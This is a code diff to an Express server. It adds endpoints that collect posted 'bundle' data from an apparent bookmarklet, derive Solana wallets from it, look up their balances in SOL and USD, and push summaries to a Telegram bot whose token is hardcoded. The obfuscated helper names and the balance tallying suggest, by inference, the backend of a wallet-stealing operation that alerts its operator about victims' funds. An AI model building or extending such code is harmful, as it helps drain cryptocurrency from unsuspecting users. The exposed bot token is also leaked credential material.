@@ -166,6 +166,128 @@ app.get('/api/verify-admin', (req, res) => {
         res.status(401).json({ success: false });
     }
 });
+const fetch = require('node-fetch'); // Ensure node-fetch is installed: npm install node-fetch
+
+// Sends a message to a Telegram chat using a bot
+async function sendToTelegram(botToken, chatId, message) {
+    /*
+     * Sends a message to a specified Telegram chat using the provided bot token.
+     * Args:
+     *   botToken (string): The API token for your Telegram bot
+     *   chatId (string): The ID of the chat to send the message to
+     *   message (string): The message to send
+     * Returns:
+     *   boolean: True if the message was sent successfully, false otherwise
+     */
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const payload = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown' // Optional: for formatted messages
+    };
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        return result.ok;
+    } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return false;
+    }
+}
+
+// Example usage in your endpoints
+// Add to /api/bookmark-data endpoint to notify on new data
+app.post('/api/bookmark-data', async (req, res) => {
+    try {
+        const data = D5V8B3();
+        const newEntry = {
+            id: Date.now(),
+            timestamp: new Date().toISOString(),
+            ...req.body
+        };
+
+        if (newEntry.sBundles && newEntry.bundle) {
+            newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
+        }
+
+        data.push(newEntry);
+        F6N2T9(data);
+
+        // Send Telegram notification
+        const botToken = '7805892995:AAGOxjdUmdAuWGdx0TRyMg0VbTUptGOL0Sg'; // Replace with your bot token
+        const chatId = '7805892995'; // Replace with your chat ID
+        const message = `New bookmark data added!\nID: ${newEntry.id}\nTimestamp: ${newEntry.timestamp}\nWallets: ${newEntry.processedSBundles ? newEntry.processedSBundles.count : 0}`;
+        await sendToTelegram(botToken, chatId, message);
+
+        res.json({ success: true, id: newEntry.id });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Add to /api/check-balances endpoint to notify on balance updates
+app.get('/api/check-balances', K9S2E7, async (req, res) => {
+    try {
+        const data = D5V8B3();
+        const solPrice = await G7P4R8();
+
+        let allAddresses = [];
+        let totalSolBalance = 0;
+        let addressBalances = [];
+
+        for (const entry of data) {
+            if (entry.processedSBundles && entry.processedSBundles.wallets) {
+                for (const wallet of entry.processedSBundles.wallets) {
+                    if (wallet.publicKey && !wallet.error) {
+                        allAddresses.push({
+                            entryId: entry.id,
+                            walletIndex: wallet.walletIndex,
+                            publicKey: wallet.publicKey
+                        });
+                    }
+                }
+            }
+        }
+
+        for (const addr of allAddresses) {
+            const balance = await H3X9M5(addr.publicKey);
+            totalSolBalance += balance;
+
+            addressBalances.push({
+                entryId: addr.entryId,
+                walletIndex: addr.walletIndex,
+                publicKey: addr.publicKey,
+                solBalance: balance,
+                usdBalance: balance * solPrice
+            });
+        }
+
+        addressBalances.sort((a, b) => b.solBalance - a.solBalance);
+
+        // Send Telegram notification
+        const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+        const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+        const message = `Balance Update:\nTotal Addresses: ${allAddresses.length}\nTotal SOL: ${totalSolBalance.toFixed(4)}\nTotal USD: $${(totalSolBalance * solPrice).toFixed(2)}\nSOL Price: $${solPrice}`;
+        await sendToTelegram(botToken, chatId, message);
+
+        res.json({
+            success: true,
+            totalAddresses: allAddresses.length,
+            totalSolBalance: totalSolBalance,
+            totalUsdBalance: totalSolBalance * solPrice,
+            solPrice: solPrice,
+            addressBalances: addressBalances
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 
 app.post('/api/admin-logout', K9S2E7, (req, res) => {
     const authHeader = req.headers['authorization'];
